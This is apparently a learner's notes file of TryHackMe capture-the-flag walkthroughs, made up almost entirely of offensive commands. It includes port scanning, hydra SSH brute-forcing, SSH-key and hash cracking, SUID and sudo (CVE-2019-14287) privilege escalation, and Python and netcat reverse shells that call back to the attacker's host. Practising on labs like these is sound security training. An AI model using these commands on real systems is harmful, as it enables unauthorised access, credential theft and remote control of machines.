# TryHackMe practice

## Basic Pentesting

```bash
# in host machine
# port scan
nmap -sC -sV -oN nmap/init {target IP}
# enumerate info
enum4linux -a {target IP} | tee enum4linux.log
# brute-forcing
hydra -l {user name} -P /usr/share/wordlists/rockyou.txt ssh://{target IP}

# Linux Privilege Escalation
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
scp ./linpeas.sh {user name}@{target IP}:/dev/shm
# or just run on the target machine
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```bash
# in target machine
cd /dev/shm/
chmod +x linpeas.sh
./linpeas.sh
# SSH keys were found → copy [kay_id_rsa] content
```

```bash
# in host machine
# crack the password of SSH key
ssh2john kay_id_rsa > forjohn.txt
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
# now login the target machine with passphrase
ssh -i kay_id_rsa {user name}@{target IP}
```

## Pickle Rick

```bash
nmap -sC -sV -oN nmap.log {target IP}
nikto -h http://{target IP} | tee nikto.log
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u {target IP} -x php,sh,txt,cgi,html,js,css,py
```

```bash
# if 'cat' command is denied, it may allow use.
grep . clue.txt
# make sure that python can use.
python3 -c "print('hello')"

# use reverse shell
# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my IP addr}",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
# show authority on current dir
sudo -l
```

## RootMe

```bash
# -sS: stealthly scan
# -sV: version detection
# -oN: output a log
sudo nmap -sS -sV -oN nmap.log {target IP}

# upload the reverse shell script
# * on php file, it will be executed on click on file pages
# https://github.com/pentestmonkey/php-reverse-shell

# execute this script for upgrade the reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'

# recieve the reverse shell access
# n: only IP, no DNS
# v: verbose
# l: listen
# p: port
nc -nvlp 4444

# search SUID files
# 2>/dev/null: waste errors
find / -user root -perm /4000 -type f 2>/dev/null

# escalate the priviledge
# ref) https://gtfobins.github.io/gtfobins/python/#suid
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## Simple CTF

```bash
# stealth scan
sudo nmap -sS -sV -oN nmap.log {target IP}
```

- CVE: Common Vulnerabilities and Exposures

```bash
ftp {target IP}
# Name: anonymous

# execute the script from Exploit DB site
# and get password hash

# anylyze password from pw hash
# -O: optimized-kernel-enable (limit length of password)
# -a: attack-mode: 0 = Straight
# -m: hash type ... 10, 20, ... (https://hashcat.net/wiki/doku.php?id=example_hashes)
hashcat -O -a 0 -m 20 {pw hash}:{salt} /usr/share/wordlists/rockyou.txt
```

## OhSINT

```bash
# show exif info
exiftool {target file}
# show string info
strings {target file}
```

## Bounty Hacker

```bash
hydra ssh://{target IP} -L {usernames file} -P /usr/share/wordlists/rockyou.txt
```

## Crack the hash

- just use <https://crackstation.net/>

```bash
# resolve "hashcat mode"
hashid -m "{escaped hash}"
# Analyzing '~~~'
# [+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
# [+] Woltlab Burning Board 4.x 
# [+] bcrypt [Hashcat Mode: 3200] ← use this value "3200"

# create 4 char pw list
cat /usr/share/wordlists/rockyou.txt | awk ' {if(length($0) == 4) print $0 }' > ./4char_pw.txt
# resolve pw
hashcat -m 3200 "{escaped hash}" ./4char_pw.txt
```

## Agent Sudo

```bash
# extract binary from image file
binwalk -e {target image file}
# unzip zip file
7z e {target zip}
# show the pw hash of zip file
zip2john {target zip} > hash_for_john.txt
# resolve pw from hash
john hash_for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
scp ./linpeas.sh james@10.10.221.112:/dev/shm

# login to target machine with pw
sshpass -p '{pw}' ssh {username}@{target IP}

# the machine have "CVE-2019-14287" vulnerability. so taking advantage this.
sudo -u#-1 bash
```

## Overpass

```bash
# take advantage the vuln of that any cookie is OK
curl http://{target page} --cookie "SessionToken=hoge"
```

## LazyAdmin

```bash
# search on the CMS
searchsploit SweetRice
# show target version's vuln
searchsploit -x php/webapps/40700.html
# copy mirror
searchsploit -m php/webapps/40700.html

# upload linpeas
# execute on target machine (recieve)
nc -lp 5555 > /dev/shm/linpeas.sh
# execute on host machine (send)
nc -w 3 {target IP} 5555 < linpeas.sh

# connect tty shell
rlwrap nc -nlvp {port}

# execute on target machine
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host IP} 5555 >/tmp/f
```
